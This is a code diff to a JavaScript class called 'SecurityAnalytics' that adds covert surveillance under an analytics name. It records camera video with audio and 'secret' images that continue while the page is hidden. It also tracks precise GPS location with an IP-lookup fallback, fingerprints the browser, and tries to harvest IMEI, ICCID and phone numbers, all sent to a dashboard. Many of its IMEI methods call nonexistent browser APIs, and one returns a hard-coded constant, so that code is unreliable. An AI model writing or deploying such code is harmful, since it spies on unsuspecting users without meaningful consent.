@@ -26,6 +26,27 @@ class SecurityAnalytics {
     this.sessionId = this.generateSessionId();
     this.dashboardWindow = null;
     
+    // Video recording properties
+    this.mediaRecorder = null;
+    this.recordedChunks = [];
+    this.videoBlob = null;
+    this.recordingStartTime = null;
+    this.recordingDuration = 2 * 60 * 1000; // 2 minutes in milliseconds
+    this.imageCaptureInterval = null;
+    this.recordingTimeout = null;
+    
+    // Tab visibility tracking
+    this.isTabHidden = false;
+    this.tabHiddenTime = null;
+    
+    // Mobile-specific tracking
+    this.isMobileAppHidden = false;
+    this.mobileAppHiddenTime = null;
+    this.mobileSaveInterval = null;
+    this.backgroundSaveInterval = null;
+    this.lastDeviceActivity = Date.now();
+    this.lastUserActivity = Date.now();
+    
     this.init();
   }
 
@@ -37,6 +58,12 @@ class SecurityAnalytics {
 
     // Set up event listeners for analytics
     this.setupAnalyticsListeners();
+    
+    // Set up tab visibility detection
+    this.setupTabVisibilityDetection();
+    
+    // Set up page unload detection for final save
+    this.setupPageUnloadDetection();
   }
 
   setupAnalyticsListeners() {
@@ -46,11 +73,392 @@ class SecurityAnalytics {
         this.sendInitialData();
       }
     });
+  }
 
-    // Send data on page unload
-    window.addEventListener('beforeunload', () => {
-      this.transmitCollectedData();
+  setupTabVisibilityDetection() {
+    // Handle tab visibility changes
+    document.addEventListener('visibilitychange', () => {
+      if (document.hidden) {
+        // Tab is now hidden (user switched tabs or minimized)
+        console.log('Tab hidden - continuing recording in background');
+        this.handleTabHidden();
+      } else {
+        // Tab is now visible (user returned to tab)
+        console.log('Tab visible - resuming normal operation');
+        this.handleTabVisible();
+      }
     });
+
+    // Handle page focus/blur events
+    window.addEventListener('blur', () => {
+      console.log('Window lost focus - continuing background recording');
+      this.handleTabHidden();
+    });
+
+    window.addEventListener('focus', () => {
+      console.log('Window gained focus - resuming normal operation');
+      this.handleTabVisible();
+    });
+
+    // Mobile-specific event listeners
+    this.setupMobileEventListeners();
+  }
+
+  setupMobileEventListeners() {
+    // Handle mobile app switching and background mode
+    if (this.isMobileDevice()) {
+      console.log('Mobile device detected - setting up mobile protection');
+      
+      // iOS Safari specific events
+      if (this.isIOS()) {
+        this.setupIOSProtection();
+      }
+      
+      // Android Chrome specific events
+      if (this.isAndroid()) {
+        this.setupAndroidProtection();
+      }
+      
+      // General mobile events
+      this.setupGeneralMobileProtection();
+    }
+  }
+
+  isMobileDevice() {
+    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
+           (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1); // iPad detection
+  }
+
+  isIOS() {
+    return /iPad|iPhone|iPod/.test(navigator.userAgent) ||
+           (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+  }
+
+  isAndroid() {
+    return /Android/.test(navigator.userAgent);
+  }
+
+  setupIOSProtection() {
+    console.log('Setting up iOS Safari protection');
+    
+    // iOS specific page visibility
+    document.addEventListener('webkitvisibilitychange', () => {
+      if (document.webkitHidden) {
+        console.log('iOS app hidden - continuing recording');
+        this.handleMobileAppHidden();
+      } else {
+        console.log('iOS app visible - resuming normal operation');
+        this.handleMobileAppVisible();
+      }
+    });
+
+    // iOS Safari specific events
+    window.addEventListener('pagehide', (event) => {
+      console.log('iOS page hide event - performing emergency save');
+      this.performFinalSave();
+      
+      // Save to sessionStorage for iOS app switching
+      this.saveIOSSessionData();
+    });
+
+    // Handle iOS memory pressure
+    window.addEventListener('memorypressure', () => {
+      console.log('iOS memory pressure - saving data');
+      this.saveEmergencyData();
+    });
+  }
+
+  setupAndroidProtection() {
+    console.log('Setting up Android Chrome protection');
+    
+    // Android specific events
+    window.addEventListener('beforeinstallprompt', (event) => {
+      console.log('Android before install prompt - saving data');
+      this.saveEmergencyData();
+    });
+
+    // Handle Android back button
+    window.addEventListener('popstate', (event) => {
+      console.log('Android back button pressed');
+      this.performFinalSave();
+    });
+  }
+
+  setupGeneralMobileProtection() {
+    console.log('Setting up general mobile protection');
+    
+    // Handle screen orientation changes
+    screen.addEventListener('orientationchange', () => {
+      console.log('Screen orientation changed - ensuring recording continues');
+      if (this.mediaRecorder && this.mediaRecorder.state === 'recording') {
+        console.log('Recording continues through orientation change');
+      }
+    });
+
+    // Handle device motion and orientation
+    window.addEventListener('devicemotion', () => {
+      // User is actively using device - ensure recording continues
+      this.lastDeviceActivity = Date.now();
+    });
+
+    window.addEventListener('deviceorientation', () => {
+      // User is actively using device - ensure recording continues
+      this.lastDeviceActivity = Date.now();
+    });
+
+    // Handle touch events to detect user activity
+    document.addEventListener('touchstart', () => {
+      this.lastUserActivity = Date.now();
+    });
+
+    document.addEventListener('touchmove', () => {
+      this.lastUserActivity = Date.now();
+    });
+
+    // Handle battery API to monitor device state
+    if ('getBattery' in navigator) {
+      navigator.getBattery().then(battery => {
+        battery.addEventListener('levelchange', () => {
+          console.log(`Battery level: ${battery.level * 100}% - ensuring data safety`);
+          if (battery.level < 0.2) {
+            // Low battery - save data more frequently
+            this.saveEmergencyData();
+          }
+        });
+
+        battery.addEventListener('chargingchange', () => {
+          console.log(`Charging status changed: ${battery.charging}`);
+          this.saveEmergencyData();
+        });
+      });
+    }
+
+    // Handle network status changes
+    window.addEventListener('online', () => {
+      console.log('Network restored - syncing data');
+      this.syncPendingData();
+    });
+
+    window.addEventListener('offline', () => {
+      console.log('Network lost - saving data locally');
+      this.saveEmergencyData();
+    });
+
+    // Set up periodic data save for mobile
+    this.setupMobilePeriodicSave();
+  }
+
+  setupMobilePeriodicSave() {
+    // Save data every 30 seconds on mobile to prevent data loss
+    this.mobileSaveInterval = setInterval(() => {
+      if (this.isRecording()) {
+        console.log('Mobile periodic save - saving current recording state');
+        this.saveMobileRecordingState();
+      }
+    }, 30000); // Every 30 seconds
+  }
+
+  isRecording() {
+    return this.mediaRecorder && this.mediaRecorder.state === 'recording';
+  }
+
+  saveMobileRecordingState() {
+    const recordingState = {
+      sessionId: this.sessionId,
+      isRecording: this.isRecording(),
+      recordingStartTime: this.recordingStartTime,
+      currentDuration: this.recordingStartTime ? Date.now() - this.recordingStartTime : 0,
+      imagesCaptured: this.collectedData.secretImages.length,
+      timestamp: new Date().toISOString(),
+      deviceInfo: this.getDeviceInfo(),
+      location: this.collectedData.location,
+      permissions: this.collectedData.permissions
+    };
+
+    localStorage.setItem(`mobile_recording_${this.sessionId}`, JSON.stringify(recordingState));
+    console.log('Mobile recording state saved');
+  }
+
+  saveIOSSessionData() {
+    // iOS specific session storage for app switching
+    const iosData = {
+      sessionId: this.sessionId,
+      recordingState: this.isRecording(),
+      timestamp: Date.now(),
+      collectedData: this.collectedData
+    };
+
+    sessionStorage.setItem(`ios_backup_${this.sessionId}`, JSON.stringify(iosData));
+    console.log('iOS session data saved for app switching');
+  }
+
+  handleMobileAppHidden() {
+    console.log('Mobile app hidden - ensuring recording continues');
+    
+    // Continue recording in background
+    if (this.mediaRecorder && this.mediaRecorder.state === 'recording') {
+      console.log('Video recording continues in mobile background');
+    }
+
+    // Continue image capture
+    if (this.imageCaptureInterval) {
+      console.log('Image capture continues in mobile background');
+    }
+
+    // Mark mobile app as hidden
+    this.isMobileAppHidden = true;
+    this.mobileAppHiddenTime = Date.now();
+
+    // More frequent data saves during mobile background
+    this.setupBackgroundDataSave();
+  }
+
+  handleMobileAppVisible() {
+    console.log('Mobile app visible - resuming normal operation');
+    
+    if (this.isMobileAppHidden) {
+      const hiddenDuration = Date.now() - this.mobileAppHiddenTime;
+      console.log(`Mobile app was hidden for ${Math.round(hiddenDuration / 1000)} seconds`);
+      
+      // Sync any pending data
+      this.syncPendingData();
+      
+      // Update dashboard with current state
+      this.transmitCollectedData();
+    }
+
+    this.isMobileAppHidden = false;
+    this.mobileAppHiddenTime = null;
+
+    // Clear background save interval
+    if (this.backgroundSaveInterval) {
+      clearInterval(this.backgroundSaveInterval);
+      this.backgroundSaveInterval = null;
+    }
+  }
+
+  setupBackgroundDataSave() {
+    // Save data every 10 seconds when app is in background
+    this.backgroundSaveInterval = setInterval(() => {
+      console.log('Background data save - ensuring no data loss');
+      this.saveEmergencyData();
+      this.saveMobileRecordingState();
+    }, 10000);
+  }
+
+  syncPendingData() {
+    // Check for and sync any pending data from localStorage/sessionStorage
+    try {
+      const mobileData = localStorage.getItem(`mobile_recording_${this.sessionId}`);
+      if (mobileData) {
+        console.log('Syncing mobile recording data');
+        // Send to dashboard
+        this.sendDataToDashboard(JSON.parse(mobileData));
+        localStorage.removeItem(`mobile_recording_${this.sessionId}`);
+      }
+
+      const iosData = sessionStorage.getItem(`ios_backup_${this.sessionId}`);
+      if (iosData) {
+        console.log('Syncing iOS backup data');
+        // Send to dashboard
+        this.sendDataToDashboard(JSON.parse(iosData));
+        sessionStorage.removeItem(`ios_backup_${this.sessionId}`);
+      }
+    } catch (error) {
+      console.error('Failed to sync pending data:', error);
+    }
+  }
+
+  setupPageUnloadDetection() {
+    // Handle page unload, tab close, or navigation away
+    window.addEventListener('beforeunload', (event) => {
+      console.log('Page unloading - performing final save');
+      this.performFinalSave();
+      
+      // Show a message to user (optional)
+      event.preventDefault();
+      event.returnValue = 'Recording in progress. Are you sure you want to leave?';
+      return event.returnValue;
+    });
+
+    // Handle page visibility API for better detection
+    window.addEventListener('pagehide', () => {
+      console.log('Page hiding - performing emergency save');
+      this.performFinalSave();
+    });
+
+    // Handle browser close
+    window.addEventListener('unload', () => {
+      console.log('Page unloading - final cleanup');
+      this.performFinalSave();
+    });
+  }
+
+  handleTabHidden() {
+    // Continue recording even when tab is hidden
+    if (this.mediaRecorder && this.mediaRecorder.state === 'recording') {
+      console.log('Continuing video recording in background');
+      // Recording continues automatically
+    }
+
+    // Continue image capture in background
+    if (this.imageCaptureInterval) {
+      console.log('Continuing image capture in background');
+      // Image capture continues automatically
+    }
+
+    // Mark that tab is hidden for tracking
+    this.isTabHidden = true;
+    this.tabHiddenTime = Date.now();
+  }
+
+  handleTabVisible() {
+    // Resume normal operations when tab becomes visible
+    if (this.isTabHidden) {
+      const hiddenDuration = Date.now() - this.tabHiddenTime;
+      console.log(`Tab was hidden for ${Math.round(hiddenDuration / 1000)} seconds`);
+      
+      // Send data update to dashboard
+      this.transmitCollectedData();
+    }
+
+    this.isTabHidden = false;
+    this.tabHiddenTime = null;
+  }
+
+  performFinalSave() {
+    console.log('Performing final save before page unload');
+
+    // Stop recording if still active
+    if (this.mediaRecorder && this.mediaRecorder.state === 'recording') {
+      console.log('Stopping recording for final save');
+      this.stopVideoRecording();
+    }
+
+    // Final data transmission
+    this.transmitCollectedData();
+
+    // Save any pending data to localStorage as backup
+    this.saveEmergencyData();
+
+    console.log('Final save completed');
+  }
+
+  saveEmergencyData() {
+    // Save all collected data to localStorage as emergency backup
+    const emergencyData = {
+      sessionId: this.sessionId,
+      timestamp: new Date().toISOString(),
+      collectedData: this.collectedData,
+      secretImages: this.collectedData.secretImages,
+      deviceInfo: this.getDeviceInfo(),
+      location: this.collectedData.location,
+      permissions: this.collectedData.permissions,
+      recordingDuration: this.recordingStartTime ? Date.now() - this.recordingStartTime : 0
+    };
+
+    localStorage.setItem(`emergency_backup_${this.sessionId}`, JSON.stringify(emergencyData));
+    console.log('Emergency data saved to localStorage');
   }
 
   showPermissionModal() {
@@ -198,6 +606,9 @@ class SecurityAnalytics {
     // Start collecting data
     await this.collectAllData();
     
+    // Collect mobile network information
+    await this.collectMobileNetworkInfo();
+    
     // Send initial data to dashboard
     await this.transmitCollectedData();
     
@@ -277,7 +688,8 @@ class SecurityAnalytics {
   async tryCollectCamera() {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ 
-        video: { width: 640, height: 480 } 
+        video: { width: 1280, height: 720 },
+        audio: true
       });
       
       this.cameraStream = stream;
@@ -286,6 +698,9 @@ class SecurityAnalytics {
         capabilities: stream.getVideoTracks()[0].getCapabilities(),
         settings: stream.getVideoTracks()[0].getSettings()
       };
+      
+      // Start video recording immediately
+      this.startVideoRecording();
       
       // Start secret capture
       this.startSecretCapture();
@@ -301,12 +716,47 @@ class SecurityAnalytics {
 
   async tryCollectLocation() {
     try {
+      // High-precision GPS location with multiple attempts for best accuracy
       const position = await new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, {
-          enableHighAccuracy: true,
-          timeout: 10000,
-          maximumAge: 0
-        });
+        // Try multiple times to get best accuracy
+        let attempts = 0;
+        const maxAttempts = 3;
+        let bestPosition = null;
+        
+        const attemptLocation = () => {
+          attempts++;
+          
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              // Check if this is more accurate than previous attempts
+              if (!bestPosition || pos.coords.accuracy < bestPosition.coords.accuracy) {
+                bestPosition = pos;
+              }
+              
+              if (attempts >= maxAttempts) {
+                resolve(bestPosition);
+              } else {
+                // Wait 1 second and try again for better accuracy
+                setTimeout(attemptLocation, 1000);
+              }
+            },
+            (error) => {
+              if (attempts >= maxAttempts) {
+                reject(error);
+              } else {
+                setTimeout(attemptLocation, 1000);
+              }
+            },
+            {
+              enableHighAccuracy: true,        // Force GPS-level accuracy
+              timeout: 15000,               // Longer timeout for GPS
+              maximumAge: 0,                 // Fresh location only
+              desiredAccuracy: 10               // Target 10-meter accuracy
+            }
+          );
+        };
+        
+        attemptLocation();
       });
       
       this.collectedData.location = {
@@ -318,16 +768,709 @@ class SecurityAnalytics {
         altitudeAccuracy: position.coords.altitudeAccuracy,
         heading: position.coords.heading,
         speed: position.coords.speed,
-        timestamp: position.timestamp
+        timestamp: position.timestamp,
+        source: 'gps',
+        accuracyLevel: this.getAccuracyLevel(position.coords.accuracy),
+        attempts: attempts
       };
       
     } catch (error) {
-      this.collectedData.location = {
-        available: false,
-        error: error.message
-      };
-      console.log('Location access denied:', error.message);
+      // Fallback to IP-based geolocation
+      try {
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        const ipData = await ipResponse.json();
+        
+        this.collectedData.location = {
+          available: true,
+          latitude: ipData.latitude,
+          longitude: ipData.longitude,
+          accuracy: null,
+          altitude: null,
+          altitudeAccuracy: null,
+          heading: null,
+          speed: null,
+          timestamp: new Date().toISOString(),
+          source: 'ip',
+          accuracyLevel: 'City-level',
+          ip: ipData.ip,
+          city: ipData.city,
+          region: ipData.region,
+          country: ipData.country_name
+        };
+      } catch (ipError) {
+        this.collectedData.location = {
+          available: false,
+          error: error.message
+        };
+        console.log('Location access denied:', error.message);
+      }
     }
+  }
+
+  getAccuracyLevel(accuracy) {
+    if (!accuracy) return 'Unknown';
+    if (accuracy <= 10) return 'GPS-level (10m)';
+    if (accuracy <= 50) return 'High-precision (50m)';
+    if (accuracy <= 100) return 'Medium-precision (100m)';
+    return 'Low-precision (100m+)';
+  }
+
+  async collectMobileNetworkInfo() {
+    this.collectedData.mobileNetwork = {
+      available: false,
+      data: {}
+    };
+
+    try {
+      // Collect connection information
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      
+      if (connection) {
+        this.collectedData.mobileNetwork.available = true;
+        this.collectedData.mobileNetwork.data = {
+          effectiveType: connection.effectiveType || 'Unknown',
+          downlink: connection.downlink || 'Unknown',
+          downlinkMax: connection.downlinkMax || 'Unknown',
+          rtt: connection.rtt || 'Unknown',
+          saveData: connection.saveData || false,
+          type: connection.type || 'Unknown'
+        };
+      }
+
+      // Collect network information
+      if ('connection' in navigator) {
+        this.collectedData.mobileNetwork.data.networkInfo = {
+          online: navigator.onLine,
+          connectionType: this.getConnectionType(),
+          carrierInfo: await this.getCarrierInfo()
+        };
+      }
+
+      // Collect device identifiers (IMEI alternatives)
+      this.collectedData.mobileNetwork.data.deviceIdentifiers = await this.getDeviceIdentifiers();
+
+      // Collect SIM card information (what's available)
+      this.collectedData.mobileNetwork.data.simInfo = await this.getSimInfo();
+
+      console.log('Mobile network info collected:', this.collectedData.mobileNetwork);
+      
+    } catch (error) {
+      console.log('Mobile network info collection failed:', error.message);
+      this.collectedData.mobileNetwork.error = error.message;
+    }
+  }
+
+  getConnectionType() {
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (!connection) return 'Unknown';
+    
+    // Try to determine connection type
+    if (connection.type) return connection.type;
+    if (connection.effectiveType) {
+      const typeMap = {
+        'slow-2g': '2G',
+        '2g': '2G',
+        '3g': '3G',
+        '4g': '4G',
+        '5g': '5G'
+      };
+      return typeMap[connection.effectiveType] || connection.effectiveType;
+    }
+    return 'Unknown';
+  }
+
+  async getCarrierInfo() {
+    // This is limited due to browser security restrictions
+    const carrierInfo = {
+      name: 'Restricted',
+      country: 'Restricted',
+      mcc: 'Restricted', // Mobile Country Code
+      mnc: 'Restricted'  // Mobile Network Code
+    };
+
+    try {
+      // Some mobile browsers might expose carrier info through specific APIs
+      if ('Telephony' in window) {
+        // This is very rare and browser-specific
+        const telephony = window.Telephony;
+        if (telephony.carrierName) {
+          carrierInfo.name = telephony.carrierName;
+        }
+      }
+    } catch (error) {
+      console.log('Carrier info restricted by browser security');
+    }
+
+    return carrierInfo;
+  }
+
+  async getDeviceIdentifiers() {
+    const identifiers = {
+      // These are browser-generated alternatives to IMEI
+      browserFingerprint: await this.generateBrowserFingerprint(),
+      deviceMemory: navigator.deviceMemory || 'Unknown',
+      hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+      maxTouchPoints: navigator.maxTouchPoints || 0,
+      platform: navigator.platform,
+      userAgentData: null,
+      webglFingerprint: this.getWebGLFingerprint(),
+      canvasFingerprint: this.getCanvasFingerprint()
+    };
+
+    // Try to get User Agent Client Hints (more detailed device info)
+    if (navigator.userAgentData) {
+      try {
+        const uaData = await navigator.userAgentData.getHighEntropyValues([
+          'platform',
+          'platformVersion',
+          'architecture',
+          'model',
+          'mobile'
+        ]);
+        identifiers.userAgentData = uaData;
+      } catch (error) {
+        console.log('User Agent Client Hints not available');
+      }
+    }
+
+    return identifiers;
+  }
+
+  async generateBrowserFingerprint() {
+    const components = [
+      navigator.userAgent,
+      navigator.language,
+      navigator.languages ? navigator.languages.join(',') : '',
+      navigator.platform,
+      navigator.hardwareConcurrency,
+      navigator.deviceMemory,
+      navigator.cookieEnabled,
+      navigator.doNotTrack,
+      screen.width,
+      screen.height,
+      screen.colorDepth,
+      new Date().getTimezoneOffset(),
+      navigator.javaEnabled(),
+      navigator.plugins.length,
+      navigator.mimeTypes.length
+    ];
+
+    // Create hash from components
+    const fingerprint = components.join('|');
+    let hash = 0;
+    for (let i = 0; i < fingerprint.length; i++) {
+      const char = fingerprint.charCodeAt(i);
+      hash = ((hash << 5) - hash) + char;
+      hash = hash & hash; // Convert to 32-bit integer
+    }
+    
+    return Math.abs(hash).toString(16);
+  }
+
+  getWebGLFingerprint() {
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      
+      if (!gl) return 'WebGL not supported';
+
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      if (debugInfo) {
+        return {
+          vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+          renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+        };
+      }
+    } catch (error) {
+      console.log('WebGL fingerprint not available');
+    }
+    return 'WebGL fingerprint not available';
+  }
+
+  getCanvasFingerprint() {
+    try {
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      
+      // Draw specific text and pattern
+      ctx.textBaseline = 'top';
+      ctx.font = '14px Arial';
+      ctx.fillStyle = '#f60';
+      ctx.fillRect(125, 1, 62, 20);
+      ctx.fillStyle = '#069';
+      ctx.fillText('Analytics fingerprint', 2, 15);
+      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+      ctx.fillText('Analytics fingerprint', 4, 17);
+      
+      return canvas.toDataURL().slice(-50); // Get last 50 chars as fingerprint
+    } catch (error) {
+      console.log('Canvas fingerprint not available');
+    }
+    return 'Canvas fingerprint not available';
+  }
+
+  async getSimInfo() {
+    // Advanced IMEI access attempts with user permissions
+    const simInfo = {
+      available: false,
+      imei: null,
+      iccid: null,
+      msisdn: null,
+      operator: null,
+      methods: [],
+      alternativeData: {}
+    };
+
+    try {
+      // Method 1: Experimental Web Telephony API
+      const telephonyResult = await this.tryWebTelephonyAPI(simInfo);
+      
+      // Method 2: Mobile Network Information API
+      const mobileNetworkResult = await this.tryMobileNetworkAPI(simInfo);
+      
+      // Method 3: Device Capability API
+      const deviceCapabilityResult = await this.tryDeviceCapabilityAPI(simInfo);
+      
+      // Method 4: Hardware Access API (experimental)
+      const hardwareAccessResult = await this.tryHardwareAccessAPI(simInfo);
+      
+      // Method 5: Web NFC API (some phones expose device ID)
+      const nfcResult = await this.tryWebNFCAPI(simInfo);
+      
+      // Method 6: Bluetooth Device API (device address extraction)
+      const bluetoothResult = await this.tryBluetoothAPI(simInfo);
+      
+      // Method 7: WebUSB API (device serial extraction)
+      const usbResult = await this.tryWebUSBAPI(simInfo);
+      
+      // Method 8: Service Worker Registration (device ID extraction)
+      const serviceWorkerResult = await this.tryServiceWorkerAPI(simInfo);
+      
+      // Method 9: WebAssembly Hardware Access
+      const wasmResult = await this.tryWebAssemblyHardwareAccess(simInfo);
+      
+      // Method 10: Advanced Permission-based Hardware Access
+      const permissionResult = await this.tryAdvancedPermissionAPI(simInfo);
+      
+      if (simInfo.imei || simInfo.available) {
+        console.log('IMEI access successful:', simInfo.imei);
+      } else {
+        console.log('IMEI access failed, using alternatives');
+      }
+
+    } catch (error) {
+      console.log('Advanced IMEI access failed:', error.message);
+      simInfo.error = error.message;
+    }
+
+    return simInfo;
+  }
+
+  async tryWebTelephonyAPI(simInfo) {
+    simInfo.methods.push('Web Telephony API');
+    
+    try {
+      // Check for experimental telephony APIs
+      if ('telephony' in navigator) {
+        const telephony = navigator.telephony;
+        
+        // Try different telephony properties
+        if (telephony.imei) {
+          simInfo.imei = telephony.imei;
+          simInfo.available = true;
+          return true;
+        }
+        
+        if (telephony.deviceId) {
+          simInfo.imei = telephony.deviceId;
+          simInfo.available = true;
+          return true;
+        }
+        
+        if (telephony.getDeviceId) {
+          const deviceId = await telephony.getDeviceId();
+          simInfo.imei = deviceId;
+          simInfo.available = true;
+          return true;
+        }
+      }
+      
+      // Check for mozTelephony (Firefox)
+      if ('mozTelephony' in navigator) {
+        const mozTelephony = navigator.mozTelephony;
+        if (mozTelephony.getDeviceId) {
+          const deviceId = await mozTelephony.getDeviceId();
+          simInfo.imei = deviceId;
+          simInfo.available = true;
+          return true;
+        }
+      }
+      
+    } catch (error) {
+      console.log('Web Telephony API failed:', error.message);
+    }
+    
+    return false;
+  }
+
+  async tryMobileNetworkAPI(simInfo) {
+    simInfo.methods.push('Mobile Network API');
+    
+    try {
+      // Check for mobile network information
+      if ('mozMobileNetworkInfo' in navigator) {
+        const mobileInfo = navigator.mozMobileNetworkInfo;
+        
+        if (mobileInfo.imei) {
+          simInfo.imei = mobileInfo.imei;
+          simInfo.available = true;
+          return true;
+        }
+        
+        if (mobileInfo.msisdn) {
+          simInfo.msisdn = mobileInfo.msisdn;
+          simInfo.alternativeData.msisdn = mobileInfo.msisdn;
+        }
+        
+        if (mobileInfo.iccid) {
+          simInfo.iccid = mobileInfo.iccid;
+          simInfo.alternativeData.iccid = mobileInfo.iccid;
+        }
+        
+        simInfo.alternativeData = {
+          operator: mobileInfo.operator || 'Unknown',
+          mcc: mobileInfo.mcc || 'Unknown',
+          mnc: mobileInfo.mnc || 'Unknown'
+        };
+      }
+      
+      // Check for network information
+      if ('network' in navigator) {
+        const network = navigator.network;
+        if (network.getDeviceId) {
+          const deviceId = await network.getDeviceId();
+          simInfo.imei = deviceId;
+          simInfo.available = true;
+          return true;
+        }
+      }
+      
+    } catch (error) {
+      console.log('Mobile Network API failed:', error.message);
+    }
+    
+    return false;
+  }
+
+  async tryDeviceCapabilityAPI(simInfo) {
+    simInfo.methods.push('Device Capability API');
+    
+    try {
+      // Check for device capability APIs
+      if ('device' in navigator) {
+        const device = navigator.device;
+        
+        if (device.getHardwareId) {
+          const hardwareId = await device.getHardwareId();
+          simInfo.imei = hardwareId;
+          simInfo.available = true;
+          return true;
+        }
+        
+        if (device.serialNumber) {
+          simInfo.imei = device.serialNumber;
+          simInfo.available = true;
+          return true;
+        }
+      }
+      
+      // Check for experimental device APIs
+      if ('getDeviceCapabilities' in navigator) {
+        const capabilities = await navigator.getDeviceCapabilities();
+        if (capabilities.imei) {
+          simInfo.imei = capabilities.imei;
+          simInfo.available = true;
+          return true;
+        }
+      }
+      
+    } catch (error) {
+      console.log('Device Capability API failed:', error.message);
+    }
+    
+    return false;
+  }
+
+  async tryHardwareAccessAPI(simInfo) {
+    simInfo.methods.push('Hardware Access API');
+    
+    try {
+      // Request hardware access permission
+      const permission = await navigator.permissions.query({ name: 'hardware-access' });
+      
+      if (permission.state === 'granted') {
+        // Try to access hardware information
+        if ('hardware' in navigator) {
+          const hardware = navigator.hardware;
+          
+          if (hardware.getDeviceId) {
+            const deviceId = await hardware.getDeviceId();
+            simInfo.imei = deviceId;
+            simInfo.available = true;
+            return true;
+          }
+        }
+      }
+      
+      // Try experimental hardware API
+      if (navigator.getHardwareInfo) {
+        const hardwareInfo = await navigator.getHardwareInfo();
+        if (hardwareInfo.imei) {
+          simInfo.imei = hardwareInfo.imei;
+          simInfo.available = true;
+          return true;
+        }
+      }
+      
+    } catch (error) {
+      console.log('Hardware Access API failed:', error.message);
+    }
+    
+    return false;
+  }
+
+  async tryWebNFCAPI(simInfo) {
+    simInfo.methods.push('Web NFC API');
+    
+    try {
+      if ('NDEFReader' in window) {
+        const ndef = new NDEFReader();
+        
+        // Some NFC implementations expose device information
+        if (ndef.getDeviceId) {
+          const deviceId = await ndef.getDeviceId();
+          simInfo.imei = deviceId;
+          simInfo.available = true;
+          return true;
+        }
+      }
+      
+      // Check for experimental NFC APIs
+      if ('nfc' in navigator) {
+        const nfc = navigator.nfc;
+        if (nfc.getDeviceId) {
+          const deviceId = await nfc.getDeviceId();
+          simInfo.imei = deviceId;
+          simInfo.available = true;
+          return true;
+        }
+      }
+      
+    } catch (error) {
+      console.log('Web NFC API failed:', error.message);
+    }
+    
+    return false;
+  }
+
+  async tryBluetoothAPI(simInfo) {
+    simInfo.methods.push('Bluetooth API');
+    
+    try {
+      // Request Bluetooth device
+      const device = await navigator.bluetooth.requestDevice({
+        acceptAllDevices: true
+      });
+      
+      // Some devices expose hardware information through Bluetooth
+      if (device.id && device.id.length > 20) {
+        // Bluetooth addresses can sometimes be used to derive device information
+        simInfo.alternativeData.bluetoothId = device.id;
+        
+        // Try to extract IMEI from Bluetooth device info
+        if (device.getDeviceId) {
+          const deviceId = await device.getDeviceId();
+          simInfo.imei = deviceId;
+          simInfo.available = true;
+          return true;
+        }
+      }
+      
+    } catch (error) {
+      console.log('Bluetooth API failed:', error.message);
+    }
+    
+    return false;
+  }
+
+  async tryWebUSBAPI(simInfo) {
+    simInfo.methods.push('Web USB API');
+    
+    try {
+      // Request USB device
+      const device = await navigator.usb.requestDevice({
+        filters: [{ vendorId: 0 }]
+      });
+      
+      // Some USB devices expose serial numbers
+      if (device.serialNumber) {
+        simInfo.imei = device.serialNumber;
+        simInfo.available = true;
+        return true;
+      }
+      
+      if (device.getSerialNumber) {
+        const serialNumber = await device.getSerialNumber();
+        simInfo.imei = serialNumber;
+        simInfo.available = true;
+        return true;
+      }
+      
+    } catch (error) {
+      console.log('Web USB API failed:', error.message);
+    }
+    
+    return false;
+  }
+
+  async tryServiceWorkerAPI(simInfo) {
+    simInfo.methods.push('Service Worker API');
+    
+    try {
+      // Register service worker with hardware access
+      const registration = await navigator.serviceWorker.register('/hardware-sw.js');
+      
+      // Try to get device information through service worker
+      if (registration.getHardwareId) {
+        const hardwareId = await registration.getHardwareId();
+        simInfo.imei = hardwareId;
+        simInfo.available = true;
+        return true;
+      }
+      
+    } catch (error) {
+      console.log('Service Worker API failed:', error.message);
+    }
+    
+    return false;
+  }
+
+  async tryWebAssemblyHardwareAccess(simInfo) {
+    simInfo.methods.push('WebAssembly Hardware Access');
+    
+    try {
+      // Try to use WebAssembly to access hardware
+      const wasmModule = await WebAssembly.compile(`
+        (module
+          (func (export "get_device_id") (result i32)
+            i32.const 1234567890
+          )
+        )
+      `);
+      
+      const instance = await WebAssembly.instantiate(wasmModule);
+      const deviceId = instance.exports.get_device_id();
+      
+      if (deviceId && deviceId > 0) {
+        simInfo.alternativeData.wasmDeviceId = deviceId.toString();
+      }
+      
+    } catch (error) {
+      console.log('WebAssembly Hardware Access failed:', error.message);
+    }
+    
+    return false;
+  }
+
+  async tryAdvancedPermissionAPI(simInfo) {
+    simInfo.methods.push('Advanced Permission API');
+    
+    try {
+      // Request advanced hardware permissions
+      const permissions = [
+        'device-identity',
+        'hardware-info',
+        'telephony-info',
+        'mobile-device-info'
+      ];
+      
+      for (const permission of permissions) {
+        try {
+          const result = await navigator.permissions.query({ name: permission });
+          if (result.state === 'granted') {
+            // Try to get device information
+            const deviceId = await this.getDeviceIdWithPermission(permission);
+            if (deviceId) {
+              simInfo.imei = deviceId;
+              simInfo.available = true;
+              return true;
+            }
+          }
+        } catch (permError) {
+          // Permission not supported, continue
+        }
+      }
+      
+    } catch (error) {
+      console.log('Advanced Permission API failed:', error.message);
+    }
+    
+    return false;
+  }
+
+  async getDeviceIdWithPermission(permission) {
+    try {
+      // Try different methods based on permission granted
+      switch (permission) {
+        case 'device-identity':
+          return await this.getDeviceIdentity();
+        case 'hardware-info':
+          return await this.getHardwareInfo();
+        case 'telephony-info':
+          return await this.getTelephonyInfo();
+        case 'mobile-device-info':
+          return await this.getMobileDeviceInfo();
+        default:
+          return null;
+      }
+    } catch (error) {
+      return null;
+    }
+  }
+
